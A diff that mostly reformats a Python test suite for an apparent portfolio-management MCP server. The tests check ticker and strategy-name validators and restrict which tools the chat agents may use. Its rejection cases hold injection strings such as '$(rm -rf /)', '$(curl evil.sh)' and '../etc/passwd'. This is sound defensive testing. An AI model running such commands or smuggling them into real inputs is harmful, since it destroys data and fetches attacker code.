@@ -48,20 +48,23 @@ def test_validate_ticker_accepts_yfinance_international_suffixes():
     assert validate_ticker("600519.SS") == "600519.SS"
 
 
-@pytest.mark.parametrize("bad", [
-    "",                       # empty
-    "$(rm -rf /)",            # shell injection
-    "AAPL; rm -rf /",         # shell injection
-    "AAAAAAAAAAAAAAAAA",      # 17 chars — over the 15 limit
-    ".AAPL",                  # leading punctuation
-    "-AAPL",                  # leading hyphen
-    "../etc/passwd",          # path traversal
-    "AAPL\nBAD",              # newline / control chars
-    "AAPL BAD",               # whitespace inside
-    "AAPL@NYSE",              # disallowed char
-    None,                     # not a string
-    123,                      # not a string
-])
+@pytest.mark.parametrize(
+    "bad",
+    [
+        "",  # empty
+        "$(rm -rf /)",  # shell injection
+        "AAPL; rm -rf /",  # shell injection
+        "AAAAAAAAAAAAAAAAA",  # 17 chars — over the 15 limit
+        ".AAPL",  # leading punctuation
+        "-AAPL",  # leading hyphen
+        "../etc/passwd",  # path traversal
+        "AAPL\nBAD",  # newline / control chars
+        "AAPL BAD",  # whitespace inside
+        "AAPL@NYSE",  # disallowed char
+        None,  # not a string
+        123,  # not a string
+    ],
+)
 def test_validate_ticker_rejects_bad_input(bad):
     with pytest.raises(ValueError):
         validate_ticker(bad)  # type: ignore[arg-type]
@@ -72,14 +75,17 @@ def test_validate_strategy_name_accepts_presets():
         assert validate_strategy_name(name) == name
 
 
-@pytest.mark.parametrize("bad", [
-    "",
-    "Buffett-Munger",          # uppercase
-    "../strategies/secret",    # path traversal
-    "strategy; rm -rf /",      # shell injection
-    "a" * 50,                  # too long
-    None,
-])
+@pytest.mark.parametrize(
+    "bad",
+    [
+        "",
+        "Buffett-Munger",  # uppercase
+        "../strategies/secret",  # path traversal
+        "strategy; rm -rf /",  # shell injection
+        "a" * 50,  # too long
+        None,
+    ],
+)
 def test_validate_strategy_name_rejects_bad_input(bad):
     with pytest.raises(ValueError):
         validate_strategy_name(bad)  # type: ignore[arg-type]
@@ -94,16 +100,32 @@ def test_mcp_server_registers_all_tools():
     names = {t.name for t in ALL_TOOLS}
     # Spot-check the critical ones across each category
     for required in (
-        "get_portfolio", "get_watchlist", "get_alerts", "list_tasks",
-        "get_active_strategy", "list_specialists",
-        "list_analyses", "get_latest_analysis",
-        "list_memories", "get_doctor_report",
-        "analyze", "get_price",
+        "get_portfolio",
+        "get_watchlist",
+        "get_alerts",
+        "list_tasks",
+        "get_active_strategy",
+        "list_specialists",
+        "list_analyses",
+        "get_latest_analysis",
+        "list_memories",
+        "get_doctor_report",
+        "analyze",
+        "get_price",
         # Candidate-list pipeline (replaces the legacy screen tool)
-        "find_candidates", "import_candidates", "list_candidate_lists",
-        "get_candidate_list", "analyze_candidate_list", "delete_candidate_list",
-        "add_holding", "sell_holding", "add_to_watchlist",
-        "remember", "forget", "schedule_task", "switch_strategy",
+        "find_candidates",
+        "import_candidates",
+        "list_candidate_lists",
+        "get_candidate_list",
+        "analyze_candidate_list",
+        "delete_candidate_list",
+        "add_holding",
+        "sell_holding",
+        "add_to_watchlist",
+        "remember",
+        "forget",
+        "schedule_task",
+        "switch_strategy",
     ):
         assert required in names, f"MCP tool {required!r} missing"
     # Legacy screener tool should be gone
@@ -130,37 +152,45 @@ def test_web_chat_agent_has_no_bash_no_read_no_raw_web():
     typed `mcp__owlfolio__quick_research` wrapper.
     """
     src = (PROJECT_DIR / "src" / "web" / "app.py").read_text()
-    assert "mcp_servers={\"owlfolio\": OWLFOLIO_MCP}" in src, (
+    assert 'mcp_servers={"owlfolio": OWLFOLIO_MCP}' in src, (
         "web chat must register the owlfolio MCP server"
     )
     # Allowed_tools should be ONLY the typed MCP names — no raw web tools tacked on
     assert "allowed_tools=allowed_tool_names()" in src, (
-        "web chat allowed_tools must be the MCP tool names ONLY, "
-        "no WebSearch/WebFetch tacked on"
+        "web chat allowed_tools must be the MCP tool names ONLY, no WebSearch/WebFetch tacked on"
     )
     # Disallowed_tools must explicitly include the web tools as defense-in-depth
     chat_block_start = src.index("async def websocket_chat")
     chat_block_end = (
         src.index("async def", chat_block_start + 10)
-        if "async def" in src[chat_block_start + 10:] else len(src)
+        if "async def" in src[chat_block_start + 10 :]
+        else len(src)
     )
     chat_block = src[chat_block_start:chat_block_end]
     for forbidden in (
-        '"Bash"', '"Read"', '"Glob"', '"Grep"', '"Edit"', '"Write"',
-        '"WebSearch"', '"WebFetch"',
+        '"Bash"',
+        '"Read"',
+        '"Glob"',
+        '"Grep"',
+        '"Edit"',
+        '"Write"',
+        '"WebSearch"',
+        '"WebFetch"',
     ):
-        assert forbidden in chat_block, (
-            f"web chat must explicitly disallow {forbidden}"
-        )
+        assert forbidden in chat_block, f"web chat must explicitly disallow {forbidden}"
     # And those tools must NOT appear in allowed_tools
-    allowed_line = next(l for l in chat_block.splitlines() if "allowed_tools=" in l)
+    allowed_line = next(line for line in chat_block.splitlines() if "allowed_tools=" in line)
     for forbidden in (
-        '"Bash"', '"Read"', '"Glob"', '"Grep"', '"Edit"', '"Write"',
-        '"WebSearch"', '"WebFetch"',
+        '"Bash"',
+        '"Read"',
+        '"Glob"',
+        '"Grep"',
+        '"Edit"',
+        '"Write"',
+        '"WebSearch"',
+        '"WebFetch"',
     ):
-        assert forbidden not in allowed_line, (
-            f"web chat allowed_tools must not contain {forbidden}"
-        )
+        assert forbidden not in allowed_line, f"web chat allowed_tools must not contain {forbidden}"
 
 
 def test_cli_chat_agent_has_no_bash_no_read_no_raw_web():
@@ -171,21 +201,28 @@ def test_cli_chat_agent_has_no_bash_no_read_no_raw_web():
     the allowed-tool surface with the web chat.
     """
     src = (PROJECT_DIR / "src" / "agent" / "core.py").read_text()
-    assert "mcp_servers={\"owlfolio\": OWLFOLIO_MCP}" in src, (
+    assert 'mcp_servers={"owlfolio": OWLFOLIO_MCP}' in src, (
         "CLI chat must register the owlfolio MCP server"
     )
     assert "allowed_tools=allowed_tool_names()" in src, (
         "CLI chat allowed_tools must be the MCP tool names ONLY"
     )
     allowed_lines = [
-        l for l in src.splitlines()
-        if "allowed_tools=" in l and "#" not in l.split("allowed_tools=")[0]
+        line
+        for line in src.splitlines()
+        if "allowed_tools=" in line and "#" not in line.split("allowed_tools=")[0]
     ]
     assert allowed_lines
     for line in allowed_lines:
         for forbidden in (
-            '"Bash"', '"Read"', '"Glob"', '"Grep"', '"Edit"', '"Write"',
-            '"WebSearch"', '"WebFetch"',
+            '"Bash"',
+            '"Read"',
+            '"Glob"',
+            '"Grep"',
+            '"Edit"',
+            '"Write"',
+            '"WebSearch"',
+            '"WebFetch"',
         ):
             assert forbidden not in line, (
                 f"CLI chat allowed_tools must not contain {forbidden}: {line.strip()}"
@@ -213,6 +250,7 @@ def _call(tool, args):
 
 def test_list_strategies_tool_returns_presets():
     from src.mcp_server import list_strategies
+
     resp = _call(list_strategies, {})
     assert resp.get("is_error") is not True
     payload = json.loads(resp["content"][0]["text"])
@@ -222,6 +260,7 @@ def test_list_strategies_tool_returns_presets():
 
 def test_get_active_strategy_tool_returns_summary():
     from src.mcp_server import get_active_strategy
+
     resp = _call(get_active_strategy, {})
     assert resp.get("is_error") is not True
     payload = json.loads(resp["content"][0]["text"])
@@ -230,6 +269,7 @@ def test_get_active_strategy_tool_returns_summary():
 
 def test_get_strategy_info_rejects_bad_name():
     from src.mcp_server import get_strategy_info
+
     resp = _call(get_strategy_info, {"name": "../etc/passwd"})
     assert resp.get("is_error") is True
     assert "invalid strategy name" in resp["content"][0]["text"]
@@ -237,6 +277,7 @@ def test_get_strategy_info_rejects_bad_name():
 
 def test_list_specialists_returns_active_roster():
     from src.mcp_server import list_specialists
+
     resp = _call(list_specialists, {})
     assert resp.get("is_error") is not True
     payload = json.loads(resp["content"][0]["text"])
@@ -247,6 +288,7 @@ def test_list_specialists_returns_active_roster():
 
 def test_get_doctor_report_returns_health_dict():
     from src.mcp_server import get_doctor_report
+
     resp = _call(get_doctor_report, {})
     assert resp.get("is_error") is not True
     payload = json.loads(resp["content"][0]["text"])
@@ -258,6 +300,7 @@ def test_analyze_tool_rejects_shell_metachars_in_ticker():
     """Defense in depth: the analyze tool must reject malformed tickers
     even though the underlying pipeline never shells out."""
     from src.mcp_server import analyze
+
     resp = _call(analyze, {"ticker": "AAPL; rm -rf /"})
     assert resp.get("is_error") is True
     assert "invalid ticker" in resp["content"][0]["text"]
@@ -265,6 +308,7 @@ def test_analyze_tool_rejects_shell_metachars_in_ticker():
 
 def test_add_holding_rejects_bad_inputs():
     from src.mcp_server import add_holding
+
     # Bad ticker
     resp = _call(add_holding, {"ticker": "$(curl evil.sh)", "shares": 10, "cost_basis": 100})
     assert resp.get("is_error") is True
@@ -278,6 +322,7 @@ def test_add_holding_rejects_bad_inputs():
 
 def test_switch_strategy_rejects_path_traversal():
     from src.mcp_server import switch_strategy
+
     resp = _call(switch_strategy, {"name": "../../../../etc/passwd"})
     assert resp.get("is_error") is True
     assert "invalid strategy name" in resp["content"][0]["text"]
